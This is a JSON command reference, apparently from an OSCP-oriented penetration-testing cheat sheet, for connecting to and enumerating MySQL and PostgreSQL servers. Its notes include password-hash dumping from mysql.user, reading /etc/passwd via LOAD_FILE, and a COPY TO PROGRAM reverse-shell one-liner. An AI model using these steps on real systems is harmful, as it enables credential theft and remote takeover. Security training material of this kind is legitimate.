{
  "category": "exploitation",
  "description": "Database connection and enumeration commands",
  "commands": [
    {
      "id": "mysql-connect-basic",
      "name": "MySQL Database Connection",
      "category": "exploitation",
      "subcategory": "database",
      "command": "mysql -h <TARGET> -P <PORT> -u <USERNAME> -p'<PASSWORD>'",
      "description": "Connect to MySQL/MariaDB database with credentials for enumeration and data extraction",
      "tags": [
        "CREDENTIAL_ACCESS",
        "DATABASE",
        "ENUMERATION",
        "MYSQL",
        "OSCP:HIGH"
      ],
      "variables": [
        {
          "name": "<TARGET>",
          "description": "MySQL server IP or hostname",
          "example": "192.168.45.100",
          "required": true
        },
        {
          "name": "<PORT>",
          "description": "MySQL port",
          "example": "3306",
          "required": false
        },
        {
          "name": "<USERNAME>",
          "description": "MySQL username",
          "example": "root",
          "required": true
        },
        {
          "name": "<PASSWORD>",
          "description": "MySQL password",
          "example": "password123",
          "required": true
        }
      ],
      "flag_explanations": {
        "-h": "MySQL server hostname or IP address",
        "-P": "Port number (uppercase P for port, default 3306)",
        "-u": "MySQL username for authentication",
        "-p": "Password (no space between -p and password to avoid prompt)"
      },
      "success_indicators": [
        "mysql>",
        "Welcome to the MySQL monitor",
        "MariaDB",
        "Server version:"
      ],
      "failure_indicators": [
        "Access denied",
        "ERROR 1045",
        "Can't connect to MySQL server",
        "ERROR 2003",
        "Unknown database"
      ],
      "next_steps": [
        "SHOW DATABASES;",
        "USE <database>;",
        "SHOW TABLES;",
        "SELECT * FROM users;",
        "SELECT user,password FROM mysql.user;"
      ],
      "alternatives": [
        "mysql -h <TARGET> -u <USER> -p (interactive password prompt)",
        "sqli-union-mysql-info (if SQL injection available)"
      ],
      "prerequisites": [
        "sudo apt install mysql-client"
      ],
      "troubleshooting": {
        "Access denied for user": "Wrong credentials or user lacks remote access. Check: SELECT user,host FROM mysql.user; (needs admin access)",
        "Can't connect to MySQL server": "Service down or port wrong. Verify: sudo nmap -p 3306 -Pn <TARGET>",
        "ERROR 1130: Host not allowed": "Your IP blocked by MySQL firewall. User may only allow localhost connections: GRANT ALL ON *.* TO '<USER>'@'%' IDENTIFIED BY '<PASS>';",
        "mysql command not found": "Install client: sudo apt install mysql-client or default-mysql-client"
      },
      "notes": "MySQL default port: 3306. Check information_schema for database structure. Time estimate: 1-2 minutes. OSCP tips: (1) Enumerate databases: SHOW DATABASES; (2) Look for: users, admin, accounts, customers tables. (3) Common columns: username, password, email, hash. (4) Extract hashes: SELECT user,password FROM mysql.user; (5) Check file read permissions: SELECT LOAD_FILE('/etc/passwd'); (6) UDF privilege escalation if admin: linux-mysql-udf. (7) For scripting: mysql -h <TARGET> -u <USER> -p'<PASS>' -e 'SHOW DATABASES;'. (8) Common usernames: root, admin, dbuser, webapp.",
      "oscp_relevance": "high"
    },
    {
      "id": "postgres-connect-basic",
      "name": "PostgreSQL Database Connection",
      "category": "exploitation",
      "subcategory": "database",
      "command": "psql -h <TARGET> -p <PORT> -U <USERNAME> -d <DATABASE>",
      "description": "Connect to PostgreSQL database with credentials for enumeration and potential code execution",
      "tags": [
        "CREDENTIAL_ACCESS",
        "DATABASE",
        "ENUMERATION",
        "OSCP:HIGH",
        "POSTGRESQL"
      ],
      "variables": [
        {
          "name": "<TARGET>",
          "description": "PostgreSQL server IP or hostname",
          "example": "192.168.45.100",
          "required": true
        },
        {
          "name": "<PORT>",
          "description": "PostgreSQL port",
          "example": "5432",
          "required": false
        },
        {
          "name": "<USERNAME>",
          "description": "PostgreSQL username",
          "example": "postgres",
          "required": true
        },
        {
          "name": "<DATABASE>",
          "description": "Database name to connect to",
          "example": "postgres",
          "required": false
        }
      ],
      "flag_explanations": {
        "-h": "PostgreSQL server hostname or IP address",
        "-p": "Port number (lowercase p for port, default 5432)",
        "-U": "PostgreSQL username for authentication (uppercase U)",
        "-d": "Database name to connect to (default: same as username)"
      },
      "success_indicators": [
        "postgres=#",
        "postgres=>",
        "psql",
        "SSL connection",
        "You are now connected"
      ],
      "failure_indicators": [
        "password authentication failed",
        "FATAL: database",
        "could not connect to server",
        "Connection refused",
        "FATAL: no pg_hba.conf entry"
      ],
      "next_steps": [
        "postgres-privilege-check",
        "postgres-file-read",
        "\\l (list databases)",
        "\\c <database> (connect to database)",
        "\\dt (list tables)",
        "SELECT * FROM users;"
      ],
      "alternatives": [
        "postgres-direct-connect (with password inline)",
        "sqli-union-postgresql-info (if SQL injection available)"
      ],
      "prerequisites": [
        "sudo apt install postgresql-client"
      ],
      "troubleshooting": {
        "password authentication failed": "Wrong credentials. PostgreSQL is case-sensitive. Verify username/password from config files",
        "FATAL: database does not exist": "Specify database: -d postgres (common default) or omit -d flag",
        "could not connect to server": "Service down or port wrong. Verify: sudo nmap -p 5432 -Pn <TARGET>",
        "FATAL: no pg_hba.conf entry": "Your IP not whitelisted. Admin must add: host all all <YOUR_IP>/32 md5 to pg_hba.conf",
        "psql command not found": "Install client: sudo apt install postgresql-client"
      },
      "notes": "PostgreSQL default port: 5432. Default database: postgres. Default superuser: postgres. Time estimate: 1-2 minutes. OSCP tips: (1) List databases: \\l or SELECT datname FROM pg_database; (2) Connect to database: \\c <db> (3) List tables: \\dt or SELECT tablename FROM pg_tables WHERE schemaname='public'; (4) Check if superuser: SELECT current_user, usesuperuser FROM pg_user WHERE usename=current_user; (5) File read (if superuser): postgres-file-read. (6) Command execution (if superuser): COPY (SELECT '') TO PROGRAM 'bash -c \"bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1\"'; (7) For scripting: PGPASSWORD='<PASS>' psql -h <TARGET> -U <USER> -d postgres -c 'SELECT version();'",
      "oscp_relevance": "high"
    }
  ]
}
